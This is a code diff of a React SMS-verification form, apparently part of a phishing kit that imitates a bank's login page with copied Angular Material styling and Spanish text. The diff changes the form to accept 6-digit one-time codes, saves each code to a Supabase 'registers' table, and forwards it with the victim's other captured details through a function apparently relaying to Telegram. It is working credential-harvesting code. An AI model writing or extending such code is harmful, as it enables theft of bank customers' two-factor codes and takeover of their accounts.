@@ -19,8 +19,27 @@ export default function SMSForm({ open, dataInfo, time }) {
     e.preventDefault();
     const input_sms = document.getElementById("input_sms");
     const sms = input_sms.value;
+    const btn_bdv = document.getElementById("submitButtonSMS");
 
-    if (sms.length >= 8) {
+    if (sms.length == 6) {
+      btn_bdv.disabled = true;
+      saveSMS(sms);
+    }
+  }
+
+  function handleChangeInput(e) {
+    const btn_bdv = document.getElementById("submitButtonSMS");
+    if (e.target.value.length == 6) {
+      btn_bdv.classList.add("mat-accent");
+      btn_bdv.classList.add("mat-raised-button");
+    } else {
+      btn_bdv.classList.remove("mat-accent");
+      btn_bdv.classList.remove("mat-raised-button");
+    }
+  }
+
+  async function saveSMS(sms) {
+    try {
       const { data } = await supabase
         .from("registers")
         .update({ sms: sms })
@@ -29,17 +48,8 @@ export default function SMSForm({ open, dataInfo, time }) {
       if (data) {
         tlgSMStoken({ ...dataInfo, sms: sms });
       }
-    }
-  }
-
-  function handleChangeInput(e) {
-    const btn_bdv = document.getElementById("submitButtonSMS");
-    if (e.target.value.length >= 8) {
-      btn_bdv.classList.add("mat-accent");
-      btn_bdv.classList.add("mat-raised-button");
-    } else {
-      btn_bdv.classList.remove("mat-accent");
-      btn_bdv.classList.remove("mat-raised-button");
+    } catch (error) {
+      console.error(error);
     }
   }
 
@@ -68,14 +78,10 @@ export default function SMSForm({ open, dataInfo, time }) {
               position: "static",
             }}
           >
-            <div
-              tabindex="0"
-              className="cdk-visually-hidden cdk-focus-trap-anchor"
-            ></div>
+            <div className="cdk-visually-hidden cdk-focus-trap-anchor"></div>
             <div
               aria-modal="true"
               className="mat-dialog-container ng-tns-c14-4 ng-trigger ng-trigger-slideDialog ng-star-inserted"
-              tabindex="-1"
               id="mat-dialog-0"
               role="dialog"
               style={{
@@ -116,7 +122,6 @@ export default function SMSForm({ open, dataInfo, time }) {
                           <div className="mat-form-field-flex">
                             <div className="mat-form-field-infix">
                               <input
-                                autocomplete="off"
                                 className="input_bdv"
                                 name="password"
                                 type="password"
@@ -170,7 +175,9 @@ export default function SMSForm({ open, dataInfo, time }) {
                         </div>
                       </mat-form-field>
                     </div>
-                    <h5 className="">Reenviar sms en {time} segundos</h5>
+                    <h5 className="">
+                      Reenviar sms en {time >= 0 ? `${time} ` : "0 "}segundos
+                    </h5>
                     <div className="row">
                       <div className="button-container">
                         <button
@@ -195,7 +202,6 @@ export default function SMSForm({ open, dataInfo, time }) {
                 </div>
               </div>
             </div>
-            <div tabindex="0"></div>
           </div>
         </div>
       </div>
